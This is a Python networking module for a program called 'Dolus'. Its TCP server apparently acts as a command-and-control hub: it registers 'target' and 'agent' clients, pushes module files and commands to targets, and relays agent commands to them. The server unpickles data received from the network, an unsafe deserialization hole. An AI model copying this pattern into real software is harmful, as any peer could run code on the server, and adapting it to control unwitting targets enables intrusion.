# Import libraries
import client_info
import client_manager
import command
import logging
import pickle
import socket
import struct
import threading

from logger import DolusLogger
from typing import cast


class TCPClient:
    """A basic TCP client for Dolus programs"""

    def __init__(self, ip: str, port: int):
        self.ip = ip
        self.port = port

        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.log = cast(DolusLogger, logging.getLogger('Dolus'))

    def connect(self) -> int:
        """Connect to the specified address"""
        try:
            self.sock.connect((self.ip, self.port))
            self.log.info('Connected to %s:%d', self.ip, self.port)
            return 0

        except Exception as error:
            self.log.debug('Failed to connect to %s:%d: %s', self.ip, self.port, error)
            return 1

    def disconnect(self) -> int:
        """Disconnect from the specified address"""
        try:
            self.sock.close()
            self.log.info('Disconnected from %s:%d', self.ip, self.port)
            return 0

        except Exception as error:
            self.log.debug('Failed to disconnect from %s:%d: %s', self.ip, self.port, error)
            return 1

    def send(self, data: bytes) -> int:
        """Send data to the specified address (4-byte header)"""
        data_packed = struct.pack('>I', len(data)) + data
        try:
            self.sock.sendall(data_packed)
            self.log.debug('Sent "%s" to %s:%d', data, self.ip, self.port)
            self.log.d_info('Sent %d bytes to %s:%d', len(data), self.ip, self.port)
            return 0

        except Exception as error:
            self.log.error('Failed to send %d bytes to %s:%d: %s', len(data), self.ip, self.port, error)
            return 1

    def __receive_all(self, size: int) -> bytes | None:
        """Receive a specified amount of data from the address"""
        data = b''

        while len(data) < size:
            packet = self.sock.recv(size - len(data))
            if not packet:
                return None

            data += packet

        return data

    def receive(self) -> bytes | None:
        """Receive data from the specified address (4-byte header)"""
        try:
            header = self.__receive_all(4)
            if not header:
                return None

            data_size = struct.unpack('>I', header)[0]
            data = self.__receive_all(data_size)
            if not data:
                return None

            self.log.debug('Received "%s" from %s:%d', data, self.ip, self.port)
            self.log.d_info('Received %d bytes from %s:%d', len(data), self.ip, self.port)
            return data

        except Exception as error:
            self.log.error('Failed to receive data from %s:%d: %s', self.ip, self.port, error)
            return None


class TCPServer:
    """A basic TCP server for Dolus programs"""

    def __init__(self, ip: str, port: int) -> None:
        self.ip = ip
        self.port = port
        self.connections = []
        self.connections_threads = []
        self.__clients_lock = threading.Lock()
        self.manager = client_manager.ClientManager()
        self.command_queue = []
        self.log = cast(DolusLogger, logging.getLogger('Dolus'))

        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.bind((self.ip, self.port))
        self.server.listen(10)
        self.manager.load_clients()

    def start(self) -> None:
        """Start the Dolus server"""
        self.log.info('Dolus server started on %s:%d', self.ip, self.port)

        while 1:
            conn, addr = self.server.accept()
            self.log.info('Accepted connection from %s:%d', addr[0], addr[1])
            with self.__clients_lock:
                self.connections.append(client_info.DolusClient(conn, addr))
                self.connections_threads.append(threading.Thread(target=self.handle_connection,
                                                                 args=(self.connections[-1],)))
                self.connections_threads[-1].start()

    def handle_connection(self, connection: client_info.DolusClient) -> None:
        """Handle a client connection"""
        # Receive client information
        connection.info = pickle.loads(self.receive(connection.conn))
        self.log.info('Received connection information from %s:%d: %s',
                      connection.addr[0], connection.addr[1], connection.info)

        if connection.info.role == client_info.ROLE_TARGET:
            self.handle_client(connection)

        if connection.info.role == client_info.ROLE_AGENT:
            self.handle_agent(connection)

    def handle_client(self, client: client_info.DolusClient) -> None:
        # Check for if the client is saved
        if self.manager.get_client(client.info.uuid) is None:
            self.manager.save_client(client.info)
            self.log.info('Saved client %s', client.info.name)

        else:
            # Check for mismatched client information
            mismatched = self.manager.check_for_mismatch(client.info)
            if mismatched:
                self.log.warning('Mismatched client information for %s, saving new information',
                                 client.info.name)

                self.manager.delete_client(client.info.uuid)
                self.manager.save_client(client.info)

        # Send the command queue to the client
        this_command_queue = []
        for intended_client, client_command in self.command_queue:
            if intended_client == client.info.uuid:
                this_command_queue.append(client_command)
                # TODO: Delete command from queue

        self.send(client.conn, pickle.dumps(this_command_queue))

        # Receive command results
        for this_command in this_command_queue:
            if this_command.type == command.INSTALL_MODULE:
                try:
                    with open(this_command.module_file, 'rb') as f:
                        module_data = f.read()

                except Exception as error:
                    self.log.error('Failed to read module %s: %s', this_command.module_file, error)
                    module_data = str(error).encode()

                self.send(client.conn, module_data)
                result = self.receive(client.conn)
                self.log.info('Received result for command %s %s: %s',
                              this_command.convert_type(this_command.type),
                              this_command.module_file, result)

            if this_command.type == command.DELETE_MODULE:
                result = self.receive(client.conn)
                self.log.info('Received result for command %s %s: %s',
                              this_command.convert_type(this_command.type),
                              this_command.module_file, result)

    def handle_agent(self, agent: client_info.DolusClient) -> None:
        # Send log file
        try:
            with open('dolus.log', 'r') as f:
                log_data = f.read().encode()

        except Exception as error:
            self.log.error('Failed to read log file: %s', error)
            log_data = str(error).encode()

        self.send(agent.conn, log_data)

        while 1:
            received_command = pickle.loads(self.receive(agent.conn))

            # Find the intended client
            intended_client = None
            for client in self.connections:
                if client.info.uuid == received_command.intended_client:
                    intended_client = client
                    break

            if intended_client is None:
                self.log.warning('Unknown client UUID: %s', received_command.intended_client)
                self.send(agent.conn, b'Unknown client UUID')
                continue

            # Send the command to the intended client
            # TODO: Add command to queue
            self.send(intended_client.conn, pickle.dumps(received_command))

            while 1:
                a = self.receive(intended_client.conn)
                self.send(agent.conn, a)

    def shutdown(self) -> None:
        """Shutdown the server"""
        # Close all client connections
        for conn, addr in self.connections:
            try:
                conn.close()

            except Exception as e:
                self.log.error('Error closing client connection %s: %s', addr, e)

        # Join all client threads
        for thread in self.connections_threads:
            thread.join()

        # Shutdown the server
        self.server.shutdown(socket.SHUT_RDWR)

    def send(self, sock: socket.socket, data: bytes) -> int:
        """Send data to the specified address (4-byte header)"""
        data_packed = struct.pack('>I', len(data)) + data
        try:
            sock.sendall(data_packed)
            self.log.debug('Sent "%s" to %s:%d', data, self.ip, self.port)
            self.log.d_info('Sent %d bytes to %s:%d', len(data), self.ip, self.port)
            return 0

        except Exception as error:
            self.log.error('Failed to send %d bytes to %s:%d: %s', len(data), self.ip, self.port, error)
            return 1

    @staticmethod
    def __receive_all(sock: socket.socket, size: int) -> bytes | None:
        """Receive a specified amount of data from the address"""
        data = b''

        while len(data) < size:
            packet = sock.recv(size - len(data))
            if not packet:
                return None

            data += packet

        return data

    def receive(self, sock: socket.socket) -> bytes | None:
        """Receive data from the specified address (4-byte header)"""
        try:
            header = self.__receive_all(sock, 4)
            if not header:
                return None

            data_size = struct.unpack('>I', header)[0]
            data = self.__receive_all(sock, data_size)
            if not data:
                return None

            self.log.debug('Received "%s" from %s:%d', data, self.ip, self.port)
            self.log.d_info('Received %d bytes from %s:%d', len(data), self.ip, self.port)
            return data

        except Exception as error:
            self.log.error('Failed to receive data from %s:%d: %s', self.ip, self.port, error)
            return None
